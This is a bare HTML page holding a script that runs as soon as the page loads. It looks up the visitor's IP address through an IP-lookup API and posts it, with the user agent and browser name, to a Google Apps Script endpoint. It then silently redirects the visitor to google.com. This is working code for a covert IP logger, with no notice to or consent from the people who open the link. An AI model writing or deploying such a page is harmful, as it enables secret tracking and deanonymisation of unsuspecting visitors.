<!DOCTYPE html>
<html>
<body>

<script>
async function logVisitor() {

  const ipData = await fetch('https://ipinfo.im/api/')
      .then(r => r.json());

  await fetch('https://script.google.com/macros/s/AKfycbyRMONixZlUy77NspqsqgGCAoHK4YoH7ZSuwwGRYhHBXZpIAjdVqPxf9snperkV59XA/exec', {
      method: 'POST',
      body: JSON.stringify({
        ip: ipData.ip,
        device: navigator.userAgent,
        browser: navigator.appName
      })
  });

  window.location.href = "https://google.com";
}

logVisitor();
</script>

</body>
</html>
